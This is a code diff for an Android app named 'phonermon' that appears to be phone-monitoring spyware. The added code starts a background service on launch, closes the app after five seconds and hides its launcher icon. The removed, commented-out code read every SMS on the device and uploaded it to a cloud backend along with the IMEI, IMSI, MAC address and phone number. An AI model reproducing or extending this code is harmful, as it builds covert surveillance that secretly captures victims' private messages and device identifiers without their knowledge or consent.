@@ -2,8 +2,11 @@ package com.my.phonermon;
 
 import java.util.List;
 
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.os.Handler;
 import android.view.View;
 import android.view.View.OnClickListener;
 
@@ -11,122 +14,47 @@ import com.my.phonermon.utils.SPUtils;
 import com.my.phonermon.utils.TelephoneUtils;
 
 public class MainActivity extends BaseActivity {
-	
+
 	public static final String URI_SMS = "content://sms";
-	
-	private void initLocalPhoneNumber(){
+
+	private void initLocalPhoneNumber() {
 		List<String> list = TelephoneUtils.getTelephoneListByDisplayname(Constants.MY_PHONE_NUMBER_KEY);
-		if(list.size() > 0){
+		if (list.size() > 0) {
 			SPUtils spUtils = new SPUtils(this);
 			spUtils.setString("localPhoneNumber", list.get(0));
 		}
-		
+
 	}
-	
+
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
 		initLocalPhoneNumber();
-		findViewById(R.id.btn).setOnClickListener(new OnClickListener() {
+		Intent intent = new Intent(MainActivity.this, ScreenBroadcastService.class);
+		startService(intent);
+		new Handler().postDelayed(new Runnable() {
 			@Override
-			public void onClick(View v) {
-				Intent intent = new Intent(MainActivity.this, ScreenBroadcastService.class);
-				startService(intent);
+			public void run() {
+				if(!isFinishing()){
+					finish();
+					hideAppIcon();
+				}
 			}
-		});
+		}, 5000);
 		
-		
-//		List<DBSMS> dbSMSList = DBUtils.query(Uri.parse(URI_SMS), null, null, null, null, DBSMS.class);
-//		List<NetSMS> localNetSMSList = convert2NetSMS(dbSMSList);
-//		List<BmobObject> datas = new ArrayList<BmobObject>();
-//		datas.addAll(localNetSMSList);
-//		NetSMS.insertBatch(datas, new SaveListener() {
-//			
+//		findViewById(R.id.btn).setOnClickListener(new OnClickListener() {
 //			@Override
-//			public void onSuccess() {
-//				ToastUtils.showToast("insertBatch success");
-//			}
-//			
-//			@Override
-//			public void onFailure(int arg0, String arg1) {
-//				ToastUtils.showToast("insertBatch failure");
-//			}
-//		});
-		
-//		NetSMS.queryAll(new FindListener<NetSMS>() {
-//			
-//			@Override
-//			public void onSuccess(List<NetSMS> netSMSList) {
-//				ToastUtils.showToast("queryAll success");
-//				List<DBSMS> dbSMSList = DBUtils.query(Uri.parse(URI_SMS), null, null, null, null, DBSMS.class);
-//				List<NetSMS> localNetSMSList = convert2NetSMS(dbSMSList);
-//				List<NetSMS> noExistNetSMSList = new ArrayList<NetSMS>();
-//				if(netSMSList != null){
-//					for (NetSMS local : localNetSMSList) {
-//						if (local == null) {
-//							continue;
-//						}
-//						if (!netSMSList.contains(local)) {
-//							noExistNetSMSList.add(local);
-//						}
-//					}
-//				} else {
-//					noExistNetSMSList.addAll(localNetSMSList);
-//				}
+//			public void onClick(View v) {
 //				
-//				List<BmobObject> datas = new ArrayList<BmobObject>();
-//				datas.addAll(noExistNetSMSList);
-//				NetSMS.insertBatch(datas, new SaveListener() {
-//					
-//					@Override
-//					public void onSuccess() {
-//						ToastUtils.showToast("insertBatch success");
-//					}
-//					
-//					@Override
-//					public void onFailure(int arg0, String arg1) {
-//						ToastUtils.showToast("insertBatch failure");
-//					}
-//				});
 //			}
-//			
-//			@Override
-//			public void onError(int code, String msg) {
-//				ToastUtils.showToast("queryAll failure");
-//			}
-//
 //		});
 	}
-//	
-//	private List<NetSMS> convert2NetSMS(List<DBSMS> dbSMSList) {
-//		List<NetSMS> result = new ArrayList<NetSMS>();
-//		if (dbSMSList != null) {
-//			for (DBSMS sms : dbSMSList) {
-//				if(sms == null){
-//					continue;
-//				}
-//				NetSMS networkSms = new NetSMS();
-//				networkSms.setBrand(android.os.Build.BRAND);
-//				networkSms.setImei(PackageUtils.getIMEI());
-//				networkSms.setImsi(PackageUtils.getIMSI());
-//				networkSms.setMac(PackageUtils.getMAC());
-//				networkSms.setModel(android.os.Build.MODEL);
-//				networkSms.setSenderTime(new Date(sms.getDate()));
-//				networkSms.setSmsMsg(sms.getBody());
-//				if(sms.getType() == 1){
-//					networkSms.setStatus(NetSMS.Receive);
-//					networkSms.setReceiver(PackageUtils.getPhoneNumber());
-//					networkSms.setSender(sms.getAddress());
-//				}else if(sms.getType() == 2){
-//					networkSms.setStatus(NetSMS.Send);
-//					networkSms.setSender(PackageUtils.getPhoneNumber());
-//					networkSms.setReceiver(sms.getAddress());
-//				}
-//				result.add(networkSms);
-//			}
-//		}
-//		return result;
-//	}	
+	
+	private void hideAppIcon(){
+		PackageManager pm = getPackageManager();
+		ComponentName componentName = new ComponentName(this, MainActivity.class);
+		pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+	}
 
 }
